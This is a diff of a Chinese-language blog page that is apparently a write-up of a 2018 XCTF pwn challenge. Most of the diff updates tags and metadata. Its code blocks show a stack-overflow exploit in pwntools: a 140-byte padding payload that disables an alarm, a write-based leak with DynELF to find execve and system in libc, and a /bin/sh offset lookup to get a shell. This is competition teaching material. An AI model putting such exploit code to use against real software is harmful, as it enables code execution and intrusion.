@@ -10,14 +10,14 @@
   <title>cyberearth xctf pwn stack writeup | Sunichi&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="第一次和大佬们一起参加CTF比赛，在pwn中选了一个栈溢出的题目来做。 先丢到ida中，如其名“跑马灯”，程序会在跑完三轮跑马灯前的最后一次，设置一个定时器并在2秒后触发进入死循环handler。在跑马灯结束到触发alarm之前，有一个窗口可以提供输入。 1234signal(14, (__sighandler_t)handler);alarm(2u);//......return gee();">
-<meta name="keywords" content="ctf,pwn">
+<meta name="keywords" content="ctf,pwn,2018,xctf,stack">
 <meta property="og:type" content="article">
 <meta property="og:title" content="cyberearth xctf pwn stack writeup">
 <meta property="og:url" content="https://sunichi.github.io/2018/02/02/cyberearth-xctf-pwn-stack/index.html">
 <meta property="og:site_name" content="Sunichi&#39;s Blog">
 <meta property="og:description" content="第一次和大佬们一起参加CTF比赛，在pwn中选了一个栈溢出的题目来做。 先丢到ida中，如其名“跑马灯”，程序会在跑完三轮跑马灯前的最后一次，设置一个定时器并在2秒后触发进入死循环handler。在跑马灯结束到触发alarm之前，有一个窗口可以提供输入。 1234signal(14, (__sighandler_t)handler);alarm(2u);//......return gee();">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-02-02T06:19:27.000Z">
+<meta property="og:updated_time" content="2018-11-16T15:12:20.165Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="cyberearth xctf pwn stack writeup">
 <meta name="twitter:description" content="第一次和大佬们一起参加CTF比赛，在pwn中选了一个栈溢出的题目来做。 先丢到ida中，如其名“跑马灯”，程序会在跑完三轮跑马灯前的最后一次，设置一个定时器并在2秒后触发进入死循环handler。在跑马灯结束到触发alarm之前，有一个窗口可以提供输入。 1234signal(14, (__sighandler_t)handler);alarm(2u);//......return gee();">
@@ -183,7 +183,7 @@
 <p>通过简单的实验可知，先前的<code>signal</code>和<code>alarm</code>可以被后来的<code>signal</code>和<code>alarm</code>所覆盖，因此首先通过溢出令<code>alarm(2u)</code>失效。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wait</span></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'*...........................................................'</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'*...........................................................'</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'*...........................................................'</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'*...........................................................'</span>)</span><br><span class="line"><span class="comment"># disable alarm</span></span><br><span class="line"><span class="comment"># 0x8048b5e call gee</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">140</span> + p32(alarm_plt) + p32(<span class="number">0x8048b5e</span>) + p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
 <p>编写<code>leak</code>函数并进行泄漏：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">140</span> + p32(write_plt) + p32(<span class="number">0x8048b5e</span>)  + p32(<span class="number">1</span>) + p32(addr) + p32(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> p.recvuntil(<span class="string">'...\n'</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="comment"># print data</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">  </span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">'./stack'</span>), libcdb=<span class="keyword">False</span>)</span><br><span class="line">execve_addr = d.lookup(<span class="string">'execve'</span>, <span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'execve:'</span> + hex(execve_addr)</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'system:'</span> + hex(system_addr)</span><br><span class="line">libcbase_addr = d.bases()[<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc base addr:'</span> + hex(libcbase_addr)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">140</span> + p32(write_plt) + p32(<span class="number">0x8048b5e</span>)  + p32(<span class="number">1</span>) + p32(addr) + p32(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> p.recvuntil(<span class="string">'...\n'</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="comment"># print data</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">'./stack'</span>), libcdb=<span class="keyword">False</span>)</span><br><span class="line">execve_addr = d.lookup(<span class="string">'execve'</span>, <span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'execve:'</span> + hex(execve_addr)</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'system:'</span> + hex(system_addr)</span><br><span class="line">libcbase_addr = d.bases()[<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc base addr:'</span> + hex(libcbase_addr)</span><br></pre></td></tr></table></figure>
 <p>在实际做题中，可以根据泄漏的函数地址找到对应的libc版本从而获取<code>/bin/sh</code>的偏移地址，由于没有环境，故直接导入本地libc。曾经尝试调用<code>system</code>并通过<code>read</code>读入<code>/bin/sh</code>字符串，但失败（包括先调用<code>start</code>恢复栈帧）。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">binsh_offset = next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'/bin/sh offset:'</span> + hex(binsh_offset)</span><br><span class="line">binsh_addr = libcbase_addr + binsh_offset</span><br></pre></td></tr></table></figure>
 <p>调用execve即可拿到shell：</p>
@@ -227,6 +227,18 @@
       		 
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">2018</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">xctf</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">stack</a>
         		</li>
       		
 		</ul>
@@ -441,19 +453,23 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">heap</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">0ctf17</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">hctf</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">2018</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">heap</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">0ctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">2017</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -465,11 +481,51 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">hitcon</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">2016</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">house</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">xctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">stack</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">lctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">ptmalloc</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">pwnable-tw</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">qwb</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">suctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">rctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">2015</a>
               </li>
             
             <div class="clearfix"></div>
